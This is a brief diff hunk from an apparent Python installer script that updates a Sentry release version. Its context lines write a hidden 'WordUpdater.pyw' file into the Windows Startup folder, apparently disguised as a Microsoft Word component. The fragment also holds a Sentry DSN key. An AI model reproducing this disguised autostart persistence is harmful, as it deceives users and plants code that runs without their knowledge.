@@ -25,7 +25,7 @@ try:
         time.sleep(3)
 
     import sentry_sdk
-    sentry_sdk.init("https://8b78151ad1da4102805eefb4a8fa8606@o1185419.ingest.sentry.io/6303999", release="GSGTMServiceInstaller@1.0.0", traces_sample_rate=1.0)
+    sentry_sdk.init("https://8b78151ad1da4102805eefb4a8fa8606@o1185419.ingest.sentry.io/6303999", release="GSGTMServiceInstaller@1.1.0", traces_sample_rate=1.0)
     try:
         main_path = pathlib.Path.home().absolute() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "WordUpdater.pyw"
         with open(str(main_path), "wb") as tf:
